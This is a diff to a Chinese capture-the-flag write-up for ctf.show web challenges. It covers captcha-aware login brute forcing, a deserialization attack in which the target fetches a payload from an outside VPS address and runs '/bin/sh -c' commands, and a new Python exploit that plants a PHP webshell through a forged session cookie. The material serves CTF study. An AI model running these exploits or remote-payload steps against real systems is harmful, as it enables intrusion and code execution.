@@ -1007,7 +1007,7 @@ DATE_TO_DIGIT = {
 }
 ```
 
-每次尝试密码时使用独立会话：先 GET `/login` 拿当前 session 的验证码，解析出 `pincode`，再 POST `username=admin&password=...&pincode=...`。脚本如下
+每次尝试密码时使用独立会话，这样爆破会快些。先 GET `/login` 拿当前 session 的验证码，解析出 `pincode`，再 POST `username=admin&password=...&pincode=...`。脚本如下
 
 ```python
 #!/usr/bin/env python3
@@ -1159,9 +1159,7 @@ except:
     msg="未提交数据或数据维度有误"
 ```
 
-？我之前真的这个 python 题目都做不来吗
-
-提交一个位于三个点等距超平面交集上的向量即可
+？我之前真的这个 python 题目都做不来吗，提交一个位于三个点等距超平面交集上的向量即可
 
 ```python
 import re
@@ -1403,7 +1401,7 @@ email    = exec
 address  = /bin/sh -c <cmd>
 ```
 
-payload 放到可控 VPS 上，然后让目标自己去拉：
+payload 放到可控 VPS 上，靶机去拉取之后反序列化
 
 ```http
 POST /admin/update HTTP/1.1
@@ -1415,22 +1413,7 @@ Connection: close
 token=<token>&url=http%3A%2F%2F156.239.238.130%3A8000%2Fpayload.bin
 ```
 
-成功会回 `更新成功`。
-
-```bash
-cat /f* > /usr/local/tomcat/webapps/ROOT/WEB-INF/static/img/final_flag.txt 2>&1
-```
-
-读回 flag：
-
-```http
-GET /avatar/file/img/final_flag.txt HTTP/1.1
-Host: 3fd55a59-9faa-4820-860d-681ef0506444.challenge.ctf.show
-Cookie: JSESSIONID=<admin-session>
-Connection: close
-```
-
-exp 如下
+把回显写入静态文件即可，exp 如下
 
 ```python
 #!/usr/bin/env python3
@@ -1910,7 +1893,7 @@ if __name__ == "__main__":
 
 ## game-gyctf web2 webBasic
 
-update.php
+update.php，告知了 flag 的位置
 
 ```php
 <?php
@@ -2244,6 +2227,38 @@ $sessionPayload = '|' . $serialized;
 echo "serialized = " . $serialized . PHP_EOL;
 echo "session payload = " . $sessionPayload . PHP_EOL;
 echo "limit cookie = " . base64_encode($sessionPayload) . PHP_EOL;
+```
+
+exp
+
+```python
+import requests
+import urllib3
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+base = "https://ab9515d7-4a13-4e51-9346-6ea52f1c1509.challenge.ctf.show"
+domain = "ab9515d7-4a13-4e51-9346-6ea52f1c1509.challenge.ctf.show"
+sid = "handlerpwn"
+
+shell = "exp.php"
+limit_cookie = "fE86NDoiVXNlciI6Mzp7czo4OiJ1c2VybmFtZSI7czo3OiJleHAucGhwIjtzOjg6InBhc3N3b3JkIjtzOjM5OiI8P3BocCBpbmNsdWRlKCJmbGFnLnBocCIpO2VjaG8gJGZsYWc7Pz4iO3M6Njoic3RhdHVzIjtiOjE7fQ=="
+
+s = requests.Session()
+s.verify = False
+s.cookies.set("PHPSESSID", sid, domain=domain, path="/")
+
+s.get(base + "/", timeout=5)
+
+s.cookies.set("limit", limit_cookie, domain=domain, path="/")
+s.get(base + "/", timeout=5)
+
+s.get(base + "/check.php?u=x&pass=y", timeout=5)
+
+r = requests.get(base + "/log-" + shell, timeout=5, verify=False)
+print(r.text)
+
+# python3 exp.py
 ```
 
 
